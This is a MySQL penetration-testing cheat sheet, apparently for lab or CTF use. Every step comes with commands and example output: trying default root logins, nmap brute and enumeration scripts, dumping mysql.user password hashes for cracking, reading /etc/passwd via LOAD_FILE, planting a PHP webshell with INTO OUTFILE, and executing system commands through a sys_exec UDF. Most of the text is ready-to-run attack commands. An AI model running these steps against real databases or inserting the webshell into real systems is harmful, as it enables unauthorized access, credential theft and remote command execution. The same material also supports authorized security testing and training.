# MySQL (3306)

### Try default creds

root with no password is common — Default installations

```bash
mysql -h $IP -u root -p
(try blank, root, toor)
```

<details>
<summary>Example Output</summary>

```
mysql -h 10.10.10.5 -u root
Welcome to the MySQL monitor.
mysql> SHOW DATABASES;
+--------------------+
| Database           |
| information_schema |
| wordpress          |
| users              |
```
</details>

---

### Nmap MySQL scripts

Enum, brute, audit — Quick overview

```bash
nmap --script mysql-* -p 3306 $IP
```

<details>
<summary>Example Output</summary>

```
nmap --script mysql-* -p 3306 10.10.10.5
| mysql-info:
|   Version: 5.7.29
|   Salt: abc123
| mysql-enum:
|   Valid usernames: root, admin
|   Accounts with empty password: root
```
</details>

---

### Enum databases

After login — Find credential tables

```bash
SHOW DATABASES;
USE <db>;
SHOW TABLES;
```

<details>
<summary>Example Output</summary>

```
mysql> SHOW DATABASES;
+--------------------+
| information_schema |
| mysql              |
| webapp             |
| secret             |
mysql> USE webapp;
mysql> SHOW TABLES;
| users | posts | config |
```
</details>

---

### Dump users/hashes

MySQL user hashes — Crack or pass-the-hash

```bash
SELECT user,password FROM mysql.user;
```

<details>
<summary>Example Output</summary>

```
SELECT user,authentication_string FROM mysql.user;
+------+-------------------------------------------+
| root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| admin| *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
(Crack with hashcat -m 300 or john)
```
</details>

---

### Read files (if FILE priv)

Read system files — LFI via database

```bash
SELECT LOAD_FILE('/etc/passwd');
```

<details>
<summary>Example Output</summary>

```
SELECT LOAD_FILE('/etc/passwd');
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:...
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
```
</details>

---

### Write files (if FILE priv)

Write webshell — RCE if web root is writable

```bash
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

<details>
<summary>Example Output</summary>

```
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
Query OK, 1 row affected
(Browse to http://10.10.10.5/shell.php?cmd=whoami)
```
</details>

---

### Check UDF for RCE

User Defined Functions — UDF can execute system commands

```bash
SELECT * FROM mysql.func;
```

<details>
<summary>Example Output</summary>

```
SELECT * FROM mysql.func;
+------+---+----------+----------+
| name | ret| dl       | type     |
| sys_exec | 0 | lib_mysqludf.so | function |
(UDF already installed = direct command exec)
SELECT sys_exec('whoami');
```
</details>

---
